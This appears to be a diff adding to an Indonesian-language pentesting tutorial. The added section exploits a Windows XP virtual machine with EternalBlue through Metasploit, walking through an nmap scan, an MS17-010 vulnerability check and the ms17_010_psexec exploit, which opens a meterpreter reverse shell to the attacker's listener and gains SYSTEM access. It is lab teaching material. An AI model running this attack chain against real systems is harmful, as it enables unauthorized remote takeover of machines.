@@ -2732,6 +2732,14 @@ msf6 exploit(windows/smb/ms17_010_eternalblue) > run
 [+] 192.168.1.5:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
 
 meterpreter >
+meterpreter > sysinfo
+Computer        : WINDOWS7
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
 ```
 
 Bangg!!! kita berhasil mengesploit Windows 7, untuk perintah di dalam `meterpreter` bisa menggunakan `help` atau kunjungi [Meterpreter Basics Command](https://www.offsec.com/metasploit-unleashed/meterpreter-basics/).
@@ -2739,3 +2747,248 @@ Bangg!!! kita berhasil mengesploit Windows 7, untuk perintah di dalam `meterpret
 >__Baca Juga__
 >* [https://en.wikipedia.org/wiki/EternalBlue](https://en.wikipedia.org/wiki/EternalBlue)
 >* [Meterpreter Basics Command](https://www.offsec.com/metasploit-unleashed/meterpreter-basics/)
+
+#### Exploit Windows XP dengan Eternalblue
+
+Proses exploit Windows XP hampir sama dengan Windows 7 sebelumnya (pastikan sudah mencoba exploit Windows 7 dengan Eternalblue sebelumnya). Perbedaannya pada eternalblue di Windows XP kita harus menggunakan payload dan pastikan LHOST payload adalah IP Address Kali Linux kita.
+
+Scan:
+
+```bash
+$ nmap -p- -A -T4 192.168.1.6
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-18 21:43 +08
+Nmap scan report for 192.168.1.6 (192.168.1.6)
+Host is up (0.0012s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT    STATE SERVICE      VERSION
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn  Microsoft Windows netbios-ssn
+445/tcp open  microsoft-ds Windows XP microsoft-ds
+MAC Address: 08:00:27:67:DA:AE (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Microsoft Windows XP
+OS CPE: cpe:/o:microsoft:windows_xp::sp2 cpe:/o:microsoft:windows_xp::sp3
+OS details: Microsoft Windows XP SP2 or SP3
+Network Distance: 1 hop
+Service Info: OSs: Windows, Windows XP; CPE: cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_xp
+
+Host script results:
+| smb-os-discovery: 
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: windowsxp
+|   NetBIOS computer name: WINDOWSXP\x00
+|   Workgroup: WORKGROUP\x00
+|_  System time: 2024-12-18T21:44:11+08:00
+|_clock-skew: mean: -4h00m00s, deviation: 5h39m24s, median: -8h00m00s
+| smb-security-mode: 
+|   account_used: <blank>
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_nbstat: NetBIOS name: WINDOWSXP, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:67:da:ae (Oracle VirtualBox virtual NIC)
+|_smb2-time: Protocol negotiation failed (SMB2)
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   1.24 ms 192.168.1.6 (192.168.1.6)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 41.82 seconds
+```
+
+Exploit dengan metasploit framework
+
+```bash
+$ msfconsole
+
+Metasploit tip: Use the resource command to run commands from a file
+                                                  
+                          ########                  #
+                      #################            #
+                   ######################         #
+                  #########################      #
+                ############################
+               ##############################
+               ###############################
+              ###############################
+              ##############################
+                              #    ########   #
+                 ##        ###        ####   ##
+                                      ###   ###
+                                    ####   ###
+               ####          ##########   ####
+               #######################   ####
+                 ####################   ####
+                  ##################  ####
+                    ############      ##
+                       ########        ###
+                      #########        #####
+                    ############      ######
+                   ########      #########
+                     #####       ########
+                       ###       #########
+                      ######    ############
+                     #######################
+                     #   #   ###  #   #   ##
+                     ########################
+                      ##     ##   ##     ##
+                            https://metasploit.com
+
+
+       =[ metasploit v6.4.38-dev                          ]
++ -- --=[ 2467 exploits - 1273 auxiliary - 431 post       ]
++ -- --=[ 1478 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search eternalblue
+
+Matching Modules
+================
+
+   #   Name                                           Disclosure Date  Rank     Check  Description
+   -   ----                                           ---------------  ----     -----  -----------
+   0   exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
+   1     \_ target: Automatic Target                  .                .        .      .
+   2     \_ target: Windows 7                         .                .        .      .
+   3     \_ target: Windows Embedded Standard 7       .                .        .      .
+   4     \_ target: Windows Server 2008 R2            .                .        .      .
+   5     \_ target: Windows 8                         .                .        .      .
+   6     \_ target: Windows 8.1                       .                .        .      .
+   7     \_ target: Windows Server 2012               .                .        .      .
+   8     \_ target: Windows 10 Pro                    .                .        .      .
+   9     \_ target: Windows 10 Enterprise Evaluation  .                .        .      .
+   10  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
+   11    \_ target: Automatic                         .                .        .      .
+   12    \_ target: PowerShell                        .                .        .      .
+   13    \_ target: Native upload                     .                .        .      .
+   14    \_ target: MOF upload                        .                .        .      .
+   15    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   16    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   17    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   18    \_ AKA: ETERNALBLUE                          .                .        .      .
+   19  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
+   20    \_ AKA: ETERNALSYNERGY                       .                .        .      .
+   21    \_ AKA: ETERNALROMANCE                       .                .        .      .
+   22    \_ AKA: ETERNALCHAMPION                      .                .        .      .
+   23    \_ AKA: ETERNALBLUE                          .                .        .      .
+   24  auxiliary/scanner/smb/smb_ms17_010             .                normal   No     MS17-010 SMB RCE Detection
+   25    \_ AKA: DOUBLEPULSAR                         .                .        .      .
+   26    \_ AKA: ETERNALBLUE                          .                .        .      .
+   27  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
+   28    \_ target: Execute payload (x64)             .                .        .      .
+   29    \_ target: Neutralize implant                .                .        .      .
+
+
+Interact with a module by name or index. For example info 29, use 29 or use exploit/windows/smb/smb_doublepulsar_rce
+After interacting with a module you can manually set a TARGET with set TARGET 'Neutralize implant'
+
+msf6 > use 24
+msf6 auxiliary(scanner/smb/smb_ms17_010) > show options
+
+Module options (auxiliary/scanner/smb/smb_ms17_010):
+
+   Name         Current Setting                                                 Required  Description
+   ----         ---------------                                                 --------  -----------
+   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts
+   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts
+   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts
+   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+   RHOSTS                                                                       yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT        445                                                             yes       The SMB service port (TCP)
+   SMBDomain    .                                                               no        The Windows domain to use for authentication
+   SMBPass                                                                      no        The password for the specified username
+   SMBUser                                                                      no        The username to authenticate as
+   THREADS      1                                                               yes       The number of concurrent threads (max one per host)
+
+
+View the full module info with the info, or info -d command.
+
+msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 192.168.1.6
+RHOSTS => 192.168.1.6
+msf6 auxiliary(scanner/smb/smb_ms17_010) > exploit
+
+[+] 192.168.1.6:445       - Host is likely VULNERABLE to MS17-010! - Windows 5.1 x86 (32-bit)
+[*] 192.168.1.6:445       - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+msf6 auxiliary(scanner/smb/smb_ms17_010) > use 10
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+msf6 exploit(windows/smb/ms17_010_psexec) > show options
+
+Module options (exploit/windows/smb/ms17_010_psexec):
+
+   Name                  Current Setting                                                 Required  Description
+   ----                  ---------------                                                 --------  -----------
+   DBGTRACE              false                                                           yes       Show extra debug trace info
+   LEAKATTEMPTS          99                                                              yes       How many times to try to leak transaction
+   NAMEDPIPE                                                                             no        A named pipe that can be connected to (leave blank for auto)
+   NAMED_PIPES           /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check
+   RHOSTS                                                                                yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT                 445                                                             yes       The Target port (TCP)
+   SERVICE_DESCRIPTION                                                                   no        Service description to be used on target for pretty listing
+   SERVICE_DISPLAY_NAME                                                                  no        The service display name
+   SERVICE_NAME                                                                          no        The service name
+   SHARE                 ADMIN$                                                          yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
+   SMBDomain             .                                                               no        The Windows domain to use for authentication
+   SMBPass                                                                               no        The password for the specified username
+   SMBUser                                                                               no        The username to authenticate as
+
+
+Payload options (windows/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.1.21     yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(windows/smb/ms17_010_psexec) > set RHOSTS 192.168.1.6
+RHOSTS => 192.168.1.6
+msf6 exploit(windows/smb/ms17_010_psexec) > exploit
+
+[*] Started reverse TCP handler on 192.168.1.21:4444 
+[*] 192.168.1.6:445 - Target OS: Windows 5.1
+[*] 192.168.1.6:445 - Filling barrel with fish... done
+[*] 192.168.1.6:445 - <---------------- | Entering Danger Zone | ---------------->
+[*] 192.168.1.6:445 -   [*] Preparing dynamite...
+[*] 192.168.1.6:445 -           [*] Trying stick 1 (x86)...Boom!
+[*] 192.168.1.6:445 -   [+] Successfully Leaked Transaction!
+[*] 192.168.1.6:445 -   [+] Successfully caught Fish-in-a-barrel
+[*] 192.168.1.6:445 - <---------------- | Leaving Danger Zone | ---------------->
+[*] 192.168.1.6:445 - Reading from CONNECTION struct at: 0x816fd8b8
+[*] 192.168.1.6:445 - Built a write-what-where primitive...
+[+] 192.168.1.6:445 - Overwrite complete... SYSTEM session obtained!
+[*] 192.168.1.6:445 - Selecting native target
+[*] 192.168.1.6:445 - Uploading payload... XthJDniT.exe
+[*] 192.168.1.6:445 - Created \XthJDniT.exe...
+[+] 192.168.1.6:445 - Service started successfully...
+[*] 192.168.1.6:445 - Deleting \XthJDniT.exe...
+[*] Sending stage (177734 bytes) to 192.168.1.6
+[*] Meterpreter session 1 opened (192.168.1.21:4444 -> 192.168.1.6:1037) at 2024-12-18 22:08:23 +0800
+
+meterpreter > 
+meterpreter > sysinfo 
+Computer        : WINDOWSXP
+OS              : Windows XP (5.1 Build 2600, Service Pack 3).
+Architecture    : x86
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x86/windows
+```
+
+Bangg!!! berhasil.
